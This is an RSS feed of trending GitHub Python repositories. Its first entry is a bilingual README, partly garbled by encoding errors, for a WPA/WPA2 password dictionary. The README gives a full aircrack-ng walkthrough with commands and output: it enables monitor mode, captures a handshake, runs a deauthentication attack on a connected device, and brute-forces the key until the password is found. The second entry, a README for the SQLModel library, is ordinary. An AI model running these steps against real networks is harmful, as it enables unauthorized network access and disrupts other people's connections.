<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-30T01:38:23Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>conwnet/wpa-dictionary</title>
    <updated>2022-08-30T01:38:23Z</updated>
    <id>tag:github.com,2022-08-30:/conwnet/wpa-dictionary</id>
    <link href="https://github.com/conwnet/wpa-dictionary" rel="alternate"></link>
    <summary type="html">&lt;p&gt;WPA/WPA2 å¯†ç å­—å…¸ï¼Œç”¨äº wifi å¯†ç æš´åŠ›ç ´è§£&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;wpa-dictionary&lt;/h1&gt; &#xA;&lt;p&gt;Used for Wi-Fi password cracking | ç”¨äº Wi-Fi å¯†ç ç ´è§£ã€‚&lt;/p&gt; &#xA;&lt;h3&gt;Linux ç¯‡ï¼ˆRecommended | æ¨èï¼‰&lt;/h3&gt; &#xA;&lt;p&gt;The Kali distribution already has everything installed | Kali å‘è¡Œç‰ˆå·²ç»å®‰è£…äº†æ‰€æœ‰ä¸œè¥¿&lt;/p&gt; &#xA;&lt;p&gt;Full english instructions at: &lt;a href=&#34;https://aircrack-ng.org/doku.php?id=getting_started&#34;&gt;https://aircrack-ng.org/doku.php?id=getting_started&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;1. Install | å®‰è£… aircrack-ng&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;On Debian/Ubuntu using apt to install: | ä½¿ç”¨ç›¸åº”åŒ…ç®¡ç†å·¥å…·å®‰è£…ï¼Œä¾‹å¦‚ Debian/Ubuntu ä½¿ç”¨ apt å®‰è£…ï¼š&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;sudo apt install aircrack-ng&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;2. View available wireless network cards | æŸ¥çœ‹å¯ç”¨çš„æ— çº¿ç½‘å¡&lt;/h3&gt; &#xA;&lt;p&gt;Use the command | ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;airmon-ng&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ sudo airmon-ng&#xA;&#xA;PHY&#x9;Interface&#x9;Driver&#x9;&#x9;Chipset&#xA;&#xA;phy0&#x9;wlp8s0&#x9;&#x9;iwlwifi&#x9;&#x9;Intel Corporation Centrino Wireless-N 2230 (rev c4)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The available wifi card is &lt;code&gt;wlp8s0&lt;/code&gt; | æ ¹æ®ä»¥ä¸Šè¾“å‡ºï¼Œå¯ç”¨çš„æ— çº¿ç½‘å¡ä¸º &lt;code&gt;wlp8s0&lt;/code&gt;ã€‚&lt;/p&gt; &#xA;&lt;h3&gt;3. Specify the wireless network card to turn on the monitor mode | æŒ‡å®šæ— çº¿ç½‘å¡å¼€å¯ç›‘å¬æ¨¡å¼ã€‚&lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;airmon-ng start &amp;lt;ç½‘å¡åç§°&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Use the command &lt;code&gt;airmon-ng start wlp8s0&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0&#xA;&#xA;PHY&#x9;Interface&#x9;Driver&#x9;&#x9;Chipset&#xA;&#xA;phy0&#x9;wlp8s0&#x9;&#x9;iwlwifi&#x9;&#x9;Intel Corporation Centrino Wireless-N 2230 (rev c4)&#xA;&#xA;&#x9;&#x9;(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)&#xA;&#x9;&#x9;(mac80211 station mode vif disabled for [phy0]wlp8s0)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now wlp8s0 is available for monitoring as &lt;code&gt;wlp8s0mon&lt;/code&gt; | æ ¹æ®ä»¥ä¸Šè¾“å‡ºï¼Œå·²ç»æŠŠ wlp8s0 è¿™å—æ— çº¿ç½‘å¡å¼€å¯ç›‘å¬æ¨¡å¼ï¼Œå¼€å¯ååå­—æ˜¯ &lt;code&gt;wlp8s0mon&lt;/code&gt;ã€‚&lt;/p&gt; &#xA;&lt;p&gt;å¼€å¯ç›‘å¬æ¨¡å¼åæ— çº¿ç½‘å¡æ— æ³•ç»§ç»­è¿æ¥ wifiï¼Œä½¿ç”¨åéœ€è¦å…³é—­ç›‘å¬æ¨¡å¼ã€‚&lt;/p&gt; &#xA;&lt;p&gt;With the monitor mode active the card can not be used to connect to any wifi, you have to stop it later to use as a normal card&lt;/p&gt; &#xA;&lt;h3&gt;4. Scan for nearby wireless networks | æ‰«æé™„è¿‘çš„æ— çº¿ç½‘ç»œ&lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;airodump-ng &amp;lt;å¤„äºç›‘å¬æ¨¡å¼çš„ç½‘å¡åç§°&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Use the command &lt;code&gt;airodump-ng wlp8s0mon&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon&#xA;&#xA; CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              &#xA;&#xA; BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&#xA;&#xA; 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    &#xA;&#xA; BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  &#xA;&#xA; 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;è¿™ä¸€æ­¥ä¼šè¾“å‡ºä¸¤ä¸ªåˆ—è¡¨ï¼Œä¸¤ä¸ªåˆ—è¡¨ä¸åœåœ¨åˆ·æ–°ã€‚&lt;/p&gt; &#xA;&lt;p&gt;ç¬¬ä¸€ä¸ªåˆ—è¡¨è¡¨ç¤ºæ‰«æåˆ°çš„æ— çº¿ç½‘ç»œ AP ä¿¡æ¯ï¼Œä¼šç”¨åˆ°ä»¥ä¸‹å‡ åˆ—ä¿¡æ¯ï¼š&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;BSSID: æ— çº¿ AP çš„ç¡¬ä»¶åœ°å€&lt;/li&gt; &#xA; &lt;li&gt;PWR: ä¿¡å·å¼ºåº¦ï¼Œå€¼æ˜¯è´Ÿæ•°ï¼Œç»å¯¹å€¼è¶Šå°è¡¨ç¤ºä¿¡å·è¶Šå¼º&lt;/li&gt; &#xA; &lt;li&gt;CH: æ— çº¿ç½‘ç»œä¿¡é“&lt;/li&gt; &#xA; &lt;li&gt;ENC: åŠ å¯†æ–¹å¼ï¼Œæˆ‘ä»¬è¦ç ´è§£çš„æ˜¯ WPA2&lt;/li&gt; &#xA; &lt;li&gt;ESSID: æ— çº¿ç½‘ç»œçš„åç§°&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;ç¬¬äºŒä¸ªåˆ—è¡¨è¡¨ç¤ºæŸä¸ªæ— çº¿ç½‘ç»œä¸­å’Œç”¨æˆ·è®¾å¤‡çš„è¿æ¥ä¿¡æ¯ï¼š&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;BSSID: æ— çº¿ AP çš„ç¡¬ä»¶åœ°å€&lt;/li&gt; &#xA; &lt;li&gt;STATION: ç”¨æˆ·è®¾å¤‡çš„ç¡¬ä»¶åœ°å€&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;æ‰«æåˆ—è¡¨ä¼šä¸åœåˆ·æ–°ï¼Œç¡®å®šæœ€ç»ˆç›®æ ‡åæŒ‰ Ctrl-C é€€å‡ºã€‚&lt;/p&gt; &#xA;&lt;p&gt;è¿™é‡Œä»…ä»…æ˜¯æ¼”ç¤ºï¼Œæ‰€ä»¥åˆ—è¡¨åªä¿ç•™äº†ä¸€æ¡ç»“æœã€‚&lt;/p&gt; &#xA;&lt;h3&gt;5. ä½¿ç”¨å‚æ•°è¿‡æ»¤æ‰«æåˆ—è¡¨ï¼Œç¡®å®šæ‰«æç›®æ ‡&lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;airodump-ng -w &amp;lt;æ‰«æç»“æœä¿å­˜çš„æ–‡ä»¶å&amp;gt; -c &amp;lt;æ— çº¿ç½‘ç»œä¿¡é“&amp;gt; --bssid &amp;lt;ç›®æ ‡æ— çº¿ AP çš„ç¡¬ä»¶åœ°å€&amp;gt; &amp;lt;å¤„äºç›‘å¬æ¨¡å¼çš„ç½‘å¡åç§°&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon&#xA;&#xA;&#xA; CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0&#xA;&#xA; BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&#xA;&#xA; 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP&#xA;&#xA; BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  &#xA;&#xA; 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;åˆšæ‰«ææ—¶çœ‹åˆ°è¾“å‡ºçš„æ‰«æçŠ¶æ€æ˜¯è¿™æ ·çš„ï¼š&lt;code&gt;CH 5 ][ Elapsed: 12 s ][ 2018-10-07 18:49&lt;/code&gt;ã€‚&lt;/p&gt; &#xA;&lt;p&gt;åªæœ‰å½“æ‰«æçŠ¶æ€åé¢å‡ºç° &lt;code&gt; ][ WPA handshake: 22:47:DA:62:2A:F0&lt;/code&gt; åï¼Œæˆ‘ä»¬æ‰æ‹¿åˆ°æ‹¿åˆ°è¿›è¡Œç ´è§£çš„æ¡æ‰‹åŒ…ã€‚&lt;/p&gt; &#xA;&lt;p&gt;æ‰«æè¿‡ç¨‹ä¸­å¦‚æœæœ‰ç”¨æˆ·è®¾å¤‡å°è¯•è¿æ¥ Wi-Fi æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šæ‹¿åˆ°æ¡æ‰‹åŒ…ã€‚&lt;/p&gt; &#xA;&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŒæ—¶ä½¿ç”¨ &lt;code&gt;aireplay-ng&lt;/code&gt; å¯¹ç›®æ ‡è®¾å¤‡è¿›è¡Œæ”»å‡»ï¼Œä½¿å…¶æ‰çº¿é‡æ–°è¿æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†æ¡æ‰‹åŒ…ã€‚&lt;/p&gt; &#xA;&lt;p&gt;æ‹¿åˆ°æ¡æ‰‹åŒ…åæŒ‰ Ctrl-C ç»“æŸæ‰«æå³å¯ã€‚&lt;/p&gt; &#xA;&lt;h3&gt;6. ä½¿ç”¨ aireplay-ng å¯¹ç›®æ ‡è®¾å¤‡å‘èµ·æ”»å‡»&lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;aireplay-ng -&amp;lt;æ”»å‡»æ¨¡å¼&amp;gt; &amp;lt;æ”»å‡»æ¬¡æ•°&amp;gt; -a æ— çº¿ AP ç¡¬ä»¶åœ°å€&amp;gt; -c &amp;lt;ç”¨æˆ·è®¾å¤‡ç¡¬ä»¶åœ°å€&amp;gt; &amp;lt;å¤„äºç›‘å¬æ¨¡å¼çš„ç½‘å¡åç§°&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon&#xA;18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6&#xA;18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]&#xA;18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]&#xA;18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;å‘èµ·æ”»å‡»åï¼Œå½“ &lt;code&gt;airodump-ng&lt;/code&gt; æˆåŠŸæ‹¿åˆ°äº†æ¡æ‰‹åŒ…ï¼Œä½¿ç”¨ Ctrl-C é€€å‡ºæ”»å‡»ã€‚&lt;/p&gt; &#xA;&lt;h3&gt;7. ä½¿ç”¨ aircrack-ng æš´åŠ›ç ´è§£ Wi-Fi å¯†ç &lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;aircrack-ng -w å¯†ç å­—å…¸ &amp;lt;åŒ…å«æ¡æ‰‹åŒ…çš„ cap æ–‡ä»¶&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap &#xA;Opening android-01.cap&#xA;Read 675 packets.&#xA;&#xA;   #  BSSID              ESSID                     Encryption&#xA;&#xA;   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)&#xA;&#xA;Choosing first network as target.&#xA;&#xA;Opening android-01.cap&#xA;Reading packets, please wait...&#xA;&#xA;                                 Aircrack-ng 1.2 rc4&#xA;&#xA;      [00:00:00] 12/2492 keys tested (828.33 k/s) &#xA;&#xA;      Time left: 2 seconds                                       0.48%&#xA;&#xA;                          KEY FOUND! [ 1234567890 ]&#xA;&#xA;&#xA;      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D &#xA;                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 &#xA;&#xA;      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED &#xA;                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 &#xA;                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 &#xA;                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A &#xA;&#xA;      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;æ ¹æ®ä»¥ä¸Šè¾“å‡ºï¼Œæˆ‘ä»¬å·²ç»ç ´è§£æˆåŠŸï¼Wi-Fi å¯†ç æ˜¯ï¼š&lt;code&gt;1234567890&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;8. æ— çº¿ç½‘å¡é€€å‡ºç›‘å¬æ¨¡å¼&lt;/h3&gt; &#xA;&lt;p&gt;ä½¿ç”¨å‘½ä»¤ï¼š&lt;code&gt;airmon-ng stop &amp;lt;å¤„äºç›‘å¬æ¨¡å¼çš„æ— é™ç½‘å¡åç§°&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon&#xA;&#xA;PHY&#x9;Interface&#x9;Driver&#x9;&#x9;Chipset&#xA;&#xA;phy0&#x9;wlp8s0mon&#x9;iwlwifi&#x9;&#x9;Intel Corporation Centrino Wireless-N 2230 (rev c4)&#xA;&#xA;&#x9;&#x9;(mac80211 station mode vif enabled on [phy0]wlp8s0)&#xA;&#xA;&#x9;&#x9;(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;MAC OS ç¯‡&lt;/h2&gt; &#xA;&lt;h3&gt;1. æŸ¥çœ‹ç½‘å¡åç§°&lt;/h3&gt; &#xA;&lt;p&gt;åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ &lt;code&gt;ifconfig&lt;/code&gt; å³å¯æŸ¥çœ‹ï¼Œé€šå¸¸æ˜¯ en0&lt;/p&gt; &#xA;&lt;h3&gt;2. ä½¿ç”¨ airport ç›‘å¬æ— çº¿ç½‘ç»œ&lt;/h3&gt; &#xA;&lt;p&gt;ç”±äºæŸäº›åŸå› ï¼Œairmon-ng æ— æ³•åœ¨ MAC OS ä½¿ç”¨ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ airport è¿›è¡Œæ‰«æå’ŒæŠ“åŒ…äº†ï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨ linux å§å°½é‡...&lt;/p&gt; &#xA;&lt;p&gt;å¼€å§‹æ‰«æï¼Œç»ˆç«¯ä¸­æ‰§è¡Œï¼š&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;æ‰«æç»“æœä¼šæ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;SSID&lt;/th&gt; &#xA;   &lt;th&gt;BSSID&lt;/th&gt; &#xA;   &lt;th&gt;RSSI&lt;/th&gt; &#xA;   &lt;th&gt;CHANNEL&lt;/th&gt; &#xA;   &lt;th&gt;HT&lt;/th&gt; &#xA;   &lt;th&gt;CC&lt;/th&gt; &#xA;   &lt;th&gt;SECURITY (auth/unicast/group)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;å°ç±³æ‰‹æœº&lt;/td&gt; &#xA;   &lt;td&gt;22:47:da:62:2a:f0&lt;/td&gt; &#xA;   &lt;td&gt;-29&lt;/td&gt; &#xA;   &lt;td&gt;6&lt;/td&gt; &#xA;   &lt;td&gt;Y&lt;/td&gt; &#xA;   &lt;td&gt;--&lt;/td&gt; &#xA;   &lt;td&gt;WPA2(PSK/AES/AES)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;SSID è¡¨ç¤º Wi-Fi åç§°&lt;/li&gt; &#xA; &lt;li&gt;BSSID è¡¨ç¤º Wi-Fi è®¾å¤‡çš„ç¡¬ä»¶åœ°å€&lt;/li&gt; &#xA; &lt;li&gt;RSSI è¡¨ç¤ºä¿¡å·å¼ºåº¦ï¼Œå€¼æ˜¯è´Ÿæ•°ï¼Œç»å¯¹å€¼è¶Šå°ä¿¡å·è¶Šå¼º&lt;/li&gt; &#xA; &lt;li&gt;CHANNEL è¡¨ç¤º Wi-Fi ä¿¡é“&lt;/li&gt; &#xA; &lt;li&gt;HT è¡¨ç¤ºååé‡æ¨¡å¼ï¼Œä¸€èˆ¬éƒ½ä¸º Y&lt;/li&gt; &#xA; &lt;li&gt;CC è¡¨ç¤ºå›½å®¶ï¼Œä¸­å›½ä¸º CN&lt;/li&gt; &#xA; &lt;li&gt;SECURITY è¡¨ç¤ºåŠ å¯†æ–¹å¼&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;3. ä½¿ç”¨ airport è¿›è¡ŒæŠ“åŒ…&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;æŠ“ä¸€æ®µå„¿äº‹ä»¶ä¹‹åï¼Œä½¿ç”¨ Ctrl + C åœæ­¢æŠ“åŒ…ï¼Œå®Œæˆåä¼šç”Ÿæˆä¸€ä¸ª cap åŒ…ï¼Œçœ‹åˆ°å¦‚ä¸‹æç¤ºï¼š&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Session saved to /tmp/airportSniff0RjCAO.cap.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;4. å®‰è£… &lt;a href=&#34;https://aircrack-ng.org/&#34;&gt;aircrack-ng&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ä½¿ç”¨ &lt;a href=&#34;https://brew.sh/&#34;&gt;Homebrew&lt;/a&gt; å®‰è£…ï¼š&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;brew install aircrack-ng&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;5. ä½¿ç”¨ aircrack-ng æ‰§è¡Œç ´è§£&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Windows&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://aircrack-ng.org/downloads.html&#34;&gt;ä¸‹è½½ Aircrack-ng&lt;/a&gt; æä¾›äº† Windows çš„äºŒè¿›åˆ¶åŒ…&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;ä½¿ç”¨ &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/wsl/about&#34;&gt;WSL&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;æ›´å¤šå®‰è£…æ–¹å¼å‚è€ƒï¼š&lt;a href=&#34;https://aircrack-ng.org/install.html&#34;&gt;å®‰è£… Aircrack-ng&lt;/a&gt;&lt;/h3&gt;</summary>
  </entry>
  <entry>
    <title>tiangolo/sqlmodel</title>
    <updated>2022-08-30T01:38:23Z</updated>
    <id>tag:github.com,2022-08-30:/tiangolo/sqlmodel</id>
    <link href="https://github.com/tiangolo/sqlmodel" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SQL databases in Python, designed for simplicity, compatibility, and robustness.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://sqlmodel.tiangolo.com&#34;&gt;&lt;img src=&#34;https://sqlmodel.tiangolo.com/img/logo-margin/logo-margin-vector.svg?sanitize=true&#34; alt=&#34;SQLModel&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;em&gt;SQLModel, SQL databases in Python, designed for simplicity, compatibility, and robustness.&lt;/em&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/tiangolo/sqlmodel/actions?query=workflow%3ATest&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://github.com/tiangolo/sqlmodel/workflows/Test/badge.svg?sanitize=true&#34; alt=&#34;Test&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/tiangolo/sqlmodel/actions?query=workflow%3APublish&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://github.com/tiangolo/sqlmodel/workflows/Publish/badge.svg?sanitize=true&#34; alt=&#34;Publish&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/tiangolo/sqlmodel&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/codecov/c/github/tiangolo/sqlmodel?color=%2334D058&#34; alt=&#34;Coverage&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/sqlmodel&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/pypi/v/sqlmodel?color=%2334D058&amp;amp;label=pypi%20package&#34; alt=&#34;Package version&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;strong&gt;Documentation&lt;/strong&gt;: &lt;a href=&#34;https://sqlmodel.tiangolo.com&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://sqlmodel.tiangolo.com&#34;&gt;https://sqlmodel.tiangolo.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Source Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/tiangolo/sqlmodel&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://github.com/tiangolo/sqlmodel&#34;&gt;https://github.com/tiangolo/sqlmodel&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;SQLModel is a library for interacting with &lt;abbr title=&#34;Also called &amp;quot;Relational databases&amp;quot;&#34;&gt;SQL databases&lt;/abbr&gt; from Python code, with Python objects. It is designed to be intuitive, easy to use, highly compatible, and robust.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLModel&lt;/strong&gt; is based on Python type annotations, and powered by &lt;a href=&#34;https://pydantic-docs.helpmanual.io/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Pydantic&lt;/a&gt; and &lt;a href=&#34;https://sqlalchemy.org/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;SQLAlchemy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The key features are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Intuitive to write&lt;/strong&gt;: Great editor support. &lt;abbr title=&#34;also known as auto-complete, autocompletion, IntelliSense&#34;&gt;Completion&lt;/abbr&gt; everywhere. Less time debugging. Designed to be easy to use and learn. Less time reading docs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Easy to use&lt;/strong&gt;: It has sensible defaults and does a lot of work underneath to simplify the code you write.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Compatible&lt;/strong&gt;: It is designed to be compatible with &lt;strong&gt;FastAPI&lt;/strong&gt;, Pydantic, and SQLAlchemy.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Extensible&lt;/strong&gt;: You have all the power of SQLAlchemy and Pydantic underneath.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Short&lt;/strong&gt;: Minimize code duplication. A single type annotation does a lot of work. No need to duplicate models in SQLAlchemy and Pydantic.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;SQL Databases in FastAPI&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://fastapi.tiangolo.com&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/logo-margin/logo-teal.png&#34; style=&#34;width: 20%;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLModel&lt;/strong&gt; is designed to simplify interacting with SQL databases in &lt;a href=&#34;https://fastapi.tiangolo.com&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;FastAPI&lt;/a&gt; applications, it was created by the same &lt;a href=&#34;https://tiangolo.com/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;author&lt;/a&gt;. ğŸ˜&lt;/p&gt; &#xA;&lt;p&gt;It combines SQLAlchemy and Pydantic and tries to simplify the code you write as much as possible, allowing you to reduce the &lt;strong&gt;code duplication to a minimum&lt;/strong&gt;, but while getting the &lt;strong&gt;best developer experience&lt;/strong&gt; possible.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLModel&lt;/strong&gt; is, in fact, a thin layer on top of &lt;strong&gt;Pydantic&lt;/strong&gt; and &lt;strong&gt;SQLAlchemy&lt;/strong&gt;, carefully designed to be compatible with both.&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;A recent and currently supported version of Python (right now, &lt;a href=&#34;https://www.python.org/downloads/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Python supports versions 3.6 and above&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;As &lt;strong&gt;SQLModel&lt;/strong&gt; is based on &lt;strong&gt;Pydantic&lt;/strong&gt; and &lt;strong&gt;SQLAlchemy&lt;/strong&gt;, it requires them. They will be automatically installed when you install SQLModel.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;div class=&#34;termy&#34;&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ pip install sqlmodel&#xA;---&amp;gt; 100%&#xA;Successfully installed sqlmodel&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/div&gt; 